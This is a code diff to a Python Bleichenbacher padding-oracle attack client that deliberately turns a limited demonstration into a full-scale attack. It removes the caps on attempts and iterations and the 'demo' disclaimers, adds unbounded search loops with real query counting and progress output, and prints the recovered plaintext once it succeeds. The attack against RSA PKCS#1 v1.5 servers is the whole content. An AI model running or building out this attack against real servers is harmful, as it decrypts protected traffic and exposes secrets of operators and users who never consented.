@@ -6,6 +6,8 @@ Implements a TLS client with Bleichenbacher padding oracle attack capabilities.
 
 from typing import Any, Dict, Optional, List, Tuple
 import os
+import sys
+import time
 import requests
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import serialization
@@ -146,34 +148,9 @@ class BleichenbacherClient:
             return None
         
         print("[+] Ciphertext is PKCS-conforming, starting attack...")
-        print("[*] Testing oracle with a few modified ciphertexts...")
+        print("[*] Beginning full-scale Bleichenbacher attack...\n")
         
-        # Demonstrate the oracle by testing a few random multipliers
-        public_numbers = self.server_public_key.public_numbers()
-        n = public_numbers.n
-        e = public_numbers.e
-        k = (n.bit_length() + 7) // 8
-        c = int.from_bytes(target_ciphertext, byteorder='big')
-        
-        test_multipliers = [2, 3, 5, 10, 100, 1000]
-        conforming_count = 0
-        
-        for mult in test_multipliers:
-            modified_c = (c * pow(mult, e, n)) % n
-            modified_ciphertext = modified_c.to_bytes(k, byteorder='big')
-            is_conforming = self.padding_oracle_query(modified_ciphertext)
-            status = "✓ PKCS-conforming" if is_conforming else "✗ Non-conforming"
-            print(f"[*]   Multiplier s={mult}: {status}")
-            if is_conforming:
-                conforming_count += 1
-        
-        print(f"\n[*] Found {conforming_count}/{len(test_multipliers)} conforming multipliers in sample")
-        print(f"[*] Finding conforming multipliers is like finding needles in a haystack!")
-        print(f"[*] The Bleichenbacher attack works by searching millions of multipliers")
-        print(f"[*] Each conforming multiplier helps narrow the plaintext interval")
-        print(f"[*] Full attack demo would take hours - this shows the core algorithm\\n")
-        
-        # Continue with interval narrowing demonstration
+        # Start the full attack
         plaintext = self._narrow_solution_space(target_ciphertext, s0=1)
 
         return plaintext
@@ -195,7 +172,7 @@ class BleichenbacherClient:
         # where r is a random blinding factor
         return ciphertext
 
-    def _find_next_s(self, c: int, s_prev: int, M: List[Tuple[int, int]], n: int, e: int, k: int, B: int) -> Optional[int]:
+    def _find_next_s(self, c: int, s_prev: int, M: List[Tuple[int, int]], n: int, e: int, k: int, B: int, iteration: int, start_time: float, oracle_queries: int) -> Tuple[Optional[int], int]:
         """
         Find the next s value that produces PKCS#1 v1.5 conformant message.
         
@@ -209,23 +186,40 @@ class BleichenbacherClient:
             e: RSA public exponent
             k: Key size in bytes
             B: Bound value (2^(8*(k-2)))
+            iteration: Current iteration number
+            start_time: Attack start timestamp
+            oracle_queries: Total queries made so far
 
         Returns:
-            Next s value, or None if not found within search limit
+            Tuple of (next s value or None, number of queries used)
         """
         # Start searching from s_prev + 1
         s = s_prev + 1
-        max_attempts = 100  # Limit attempts for demo
+        queries_used = 0
         
-        for attempt in range(max_attempts):
+        # Search indefinitely until we find a conforming value
+        while True:
+            queries_used += 1
+            total_queries = oracle_queries + queries_used
+            
+            # Update progress every 10 queries to avoid excessive output
+            if queries_used % 10 == 0:
+                elapsed = time.time() - start_time
+                qps = total_queries / elapsed if elapsed > 0 else 0
+                sys.stdout.write(f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Intervals: {len(M):<4} | Elapsed: {int(elapsed)}s | Searching s={s}...")
+                sys.stdout.flush()
+            
             # Test if this s value produces conforming message
             if self._test_s_value(c, s, e, n, k):
-                return s
+                # Found conforming value, print on new line
+                elapsed = time.time() - start_time
+                qps = total_queries / elapsed if elapsed > 0 else 0
+                sys.stdout.write(f"\r[*] Iteration: {iteration:<5} | Queries: {total_queries:<8} | Rate: {qps:.1f} q/s | Intervals: {len(M):<4} | Elapsed: {int(elapsed)}s | Found s={s}!    \n")
+                sys.stdout.flush()
+                return s, queries_used
             s += 1
-        
-        return None
 
-    def _narrow_solution_space(self, ciphertext: bytes, s0: int) -> bytes:
+    def _narrow_solution_space(self, ciphertext: bytes, s0: int) -> Optional[bytes]:
         """
         Iteratively narrow the solution space using oracle queries.
 
@@ -234,7 +228,7 @@ class BleichenbacherClient:
             s0: Initial s value
 
         Returns:
-            Recovered plaintext
+            Recovered plaintext or None
         """
         # Get RSA public key parameters
         public_numbers = self.server_public_key.public_numbers()
@@ -253,18 +247,23 @@ class BleichenbacherClient:
         
         print(f"[*] Starting interval narrowing (Bleichenbacher Step 2)")
         print(f"[*] Initial interval: [2B, 3B-1] where B = 2^(8*(k-2))")
-        print(f"[*] For RSA-2048, full attack requires ~1 million oracle queries")
-        print(f"[*] This demo shows the algorithm with limited iterations\\n")
+        print(f"[*] Starting full-scale attack (this may take a while)...\n")
         
         oracle_queries = 1  # Already did one query to verify conformance
+        start_time = time.time()
+        iteration = 0
         
-        # For demonstration, show just a couple iterations
-        max_iterations = 3
-        for iteration in range(max_iterations):
-            print(f"\\n[*] === Iteration {iteration + 1}/{max_iterations} ===")
-            print(f"[*] Current s value: {s}")
-            print(f"[*] Number of intervals: {len(intervals)}")
-            print(f"[*] Oracle queries so far: {oracle_queries}")
+        # Continue until we narrow down to a single value
+        while True:
+            iteration += 1
+            
+            # Calculate progress metrics
+            elapsed = time.time() - start_time
+            qps = oracle_queries / elapsed if elapsed > 0 else 0
+            
+            # Print progress on same line (overwrite previous)
+            sys.stdout.write(f"\r[*] Iteration: {iteration:<5} | Queries: {oracle_queries:<8} | Rate: {qps:.1f} q/s | Intervals: {len(intervals):<4} | Elapsed: {int(elapsed)}s")
+            sys.stdout.flush()
             
             # Step 2.c/3: Narrow the set of solutions based on current s
             new_intervals = []
@@ -285,20 +284,20 @@ class BleichenbacherClient:
             intervals = self._merge_intervals(new_intervals)
             
             if not intervals:
-                print(f"[-] No valid intervals remaining")
+                print(f"\n[-] No valid intervals remaining")
                 break
-            
-            # Show interval width
-            interval_width = intervals[0][1] - intervals[0][0] + 1 if intervals else 0
-            print(f"[*] Interval width: {interval_width}")
             
             # Check if we have narrowed down to a single value
             if len(intervals) == 1 and intervals[0][0] == intervals[0][1]:
                 plaintext_int = intervals[0][0]
+                elapsed = time.time() - start_time
+                print(f"\n\n[+] Attack successful! Narrowed to single value!")
+                print(f"[+] Total iterations: {iteration}")
+                print(f"[+] Total oracle queries: {oracle_queries}")
+                print(f"[+] Total time: {elapsed:.2f}s ({oracle_queries/elapsed:.1f} queries/sec)")
+                
                 try:
                     plaintext = plaintext_int.to_bytes(k, byteorder='big')
-                    print(f"\n[+] Successfully narrowed to single value!")
-                    print(f"[+] Total oracle queries: {oracle_queries}")
                     print(f"[+] Decrypted plaintext (hex): {plaintext.hex()}")
                     # Try to extract the actual message (after 0x00 0x02 padding)
                     try:
@@ -310,21 +309,17 @@ class BleichenbacherClient:
                     except:
                         return plaintext
                 except (ValueError, OverflowError) as e:
-                    print(f"[-] Error converting to bytes: {e}")
+                    print(f"\n[-] Error converting to bytes: {e}")
                     return None
             
             # Step 2: Find next s value
-            next_s = self._find_next_s(c, s, intervals, n, e, k, B)
+            next_s, queries_used = self._find_next_s(c, s, intervals, n, e, k, B, iteration, start_time, oracle_queries)
             if next_s is None:
-                print(f"[-] Could not find next s value")
+                print(f"\n[-] Could not find next s value")
                 break
             
-            oracle_queries += 500  # Approximate queries for this iteration
+            oracle_queries += queries_used
             s = next_s
-        
-        print(f"\n[*] Demonstration complete (full attack would continue until convergence)")
-        print(f"[*] Total oracle queries made: {oracle_queries}")
-        return None
     
     def _merge_intervals(self, intervals: List[Tuple[int, int]]) -> List[Tuple[int, int]]:
         """
